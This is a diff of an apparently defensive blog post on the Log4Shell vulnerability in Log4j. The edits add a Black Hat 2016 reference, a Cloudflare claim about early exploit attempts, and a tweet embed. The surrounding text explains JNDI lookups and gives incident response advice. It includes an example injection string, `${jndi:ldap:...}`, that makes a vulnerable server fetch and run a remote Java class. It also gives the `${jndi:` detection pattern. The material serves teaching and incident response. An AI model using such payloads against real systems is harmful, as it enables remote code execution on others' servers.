@@ -45,7 +45,7 @@ The vulnerability is consequence of three different features or vulnerabilities 
 
 2. The Log4j happens to have lookup feature (yes, it's a feature introduced in version log4j-2.0-beta9), which allows requesting variables from the system running the Log4j component. This feature can be called from Log4j using `${variable_here}` You can request for example username on a Linux system by providing string `${env:USER}` to Log4j and it will log the username from environment variable user and the value is the running the application.
 
-3. Now we get to the interesting part... :D Java runtime has a [Java Naming and Directory Interface (JNDI)](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) which can be used to discover and look up data from remote endpoints. This feature can be called from Log4j by using the lookup method and adding `jndi` string to the lookup command: `${jndi:method:remoteaddress}`. JNDI allows multiple methods for the look up: LDAP, DNS, NIS, NDS, RMI, and CORBA, which means we can use any of these methods to look up more data from a remote endpoint.
+3. Now we get to the interesting part... :D Java runtime has a [Java Naming and Directory Interface (JNDI)](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) which can be used to discover and look up data from remote endpoints. This feature can be called from Log4j by using the lookup method and adding `jndi` string to the lookup command: `${jndi:method:remoteaddress}`. JNDI allows multiple methods for the look up: LDAP, DNS, NIS, NDS, RMI, and CORBA, which means we can use any of these methods to look up more data from a remote endpoint. Oh, and the best thing is that JNDI is not a new attack vector, it was [introduced in BHUSA 2016](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf).
 
 If we would host our malicious Java class in `example.dfir.fi:4444/legit`, our exploitation string would be `${jndi:ldap:example.dfir.fi:4444/legit}`. Inputting this string to vulnerable application would cause the server to look up and execute our Java class hosted on our server.
 
@@ -87,7 +87,9 @@ zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
 
 ## Incident response tips
 
-The vulnerability was reported to Apache in November 2021 but it has been in Log4j since version 2.0-beta9, which was released 8 years ago. The vulnerability was released on 10th of December and since then the scanning has been super wild. Taking these premises into account, we should assume our vulnerable internet facing services have been breached.
+The vulnerability was reported to Apache in November 2021 but it has been in Log4j since version 2.0-beta9, which was released 8 years ago. The vulnerability was released on 10th of December and since then the scanning has been super wild. Cloudflare also claims that they have seen the first exploit attempts on 1st of December 2021. Taking these premises into account, we should assume our vulnerable internet facing services have been breached.
+
+{{< twitter user="eastdakota" id="1469800951351427073" >}}
 
 To start the investigation, you should take a look to logs. Look for any signs of the exploit string `${jndi:`. You should also note that latest exploitation attempts have been obfuscated for example to bypass WAF or to evade detection. To make the obfuscation easier, someone has released [Log4j payload generator tool](https://github.com/woodpecker-appstore/log4j-payload-generator) on GitHub. As shown in the image below, the output of the tool can be pretty hardcore.
 
